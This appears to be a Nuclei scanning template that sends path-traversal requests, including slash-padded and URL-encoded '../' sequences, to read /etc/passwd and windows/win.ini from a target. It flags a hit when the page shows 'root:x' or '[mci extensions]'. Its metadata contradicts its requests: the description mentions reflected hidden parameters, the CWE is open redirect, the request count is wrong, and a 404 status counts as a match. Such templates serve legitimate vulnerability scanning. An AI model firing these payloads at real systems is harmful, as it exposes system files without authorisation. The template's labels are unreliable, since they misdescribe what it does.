id: 2lfiss

info:
  name: 2lfipp
  author: xandsz
  severity: medium
  description: |
    Verifica parametros ocultos que refletem dentro do HTML da pagina
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-601
  metadata:
    max-request: 2
  tags: fuzzer, generic

http:
  - method: GET
    path:

      - "{{BaseURL}}///////////etc/passwd"
      - "{{BaseURL}}%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/passwd"
      - "{{BaseURL}}///////////windows/win.ini"      
      
      
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:                    
          - "root:x"
          - "[mci extensions]"
          
      - type: status
        status:
          - 200
          - 404
